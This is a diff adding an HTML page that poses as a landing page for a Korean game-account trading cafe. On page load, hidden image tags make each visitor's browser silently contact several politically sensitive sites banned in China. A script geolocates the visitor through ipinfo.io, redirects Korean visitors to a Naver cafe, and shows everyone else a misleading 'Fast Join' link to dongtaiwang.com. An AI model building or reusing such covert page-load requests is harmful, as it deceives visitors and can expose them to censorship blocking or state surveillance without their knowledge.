@@ -1,0 +1,58 @@
+<html>
+  <head>
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="korea twom kooi trade" />
+    <meta property="og:description" content="아이모 계정 거래 카페" />
+    <meta property="og:image" content="https://cafefiles.pstatic.net/20130417_129/26059935_1366130809029_4e24oT_png/26059935_user_014649.png" />
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  </head>
+  <img style="display: none;" src="http://dongtaiwang.com" />
+  <img style="display: none;" src="https://www.freetibet.org" />
+  <img style="display: none;" src="https://www.uyghurcongress.org/en/%20" />
+  <img style="display: none;" src="https://kr-mb.theepochtimes.com/" />
+  <img style="display: none;" src="https://www.freehongkong.org" />
+  <img style="display: none;" src="https://www.taiwan.gov.tw/" />
+  <img style="display: none;" src="http://www.yibaochina.com/" />
+  <img style="display: none;" src="https://theinitium.com/" />
+  <img style="display: none;" src="https://boxun.com/" />
+  <img style="display: none;" src="http://www.minghui.org/" />
+  <img style="display: none;" src="https://tibet.net/" />
+  <body>
+    <script type="text/javascript">
+      var ip = "";
+      var hostname = "";
+      var city = "";
+      var region = "";
+      var country = "";
+      var loc = "";
+      var org = "";
+
+      $.getJSON("http://ipinfo.io", function(data) {
+        ip = data.ip; // 접속자 ip
+        hostname = data.hostname; // 접속자 hostname
+        city = data.city; // 접속자 도시
+        region = data.region; // 접속자 지역
+        country = data.country; // 접속자 국가
+        loc = data.loc; // 접속 위도, 경도
+        org = data.org; // ISP (인터넷 서비스 제공사업자)
+
+        if (country == "KR") {
+          console.log(data);
+          window.location.href = "https://cafe.naver.com/globaltwom";
+        } else if (country == "CN") {
+          var btn = document.createElement("a");
+          var btntext = document.createTextNode("Fast Join");
+          btn.setAttribute("href", "http://dongtaiwang.com");
+          btn.appendChild(btntext);
+          document.body.appendChild(btn);
+        } else {
+          var btn = document.createElement("a");
+          var btntext = document.createTextNode("Fast Join");
+          btn.setAttribute("href", "http://dongtaiwang.com");
+          btn.appendChild(btntext);
+          document.body.appendChild(btn);
+        }
+      });
+    </script>
+  </body>
+</html>
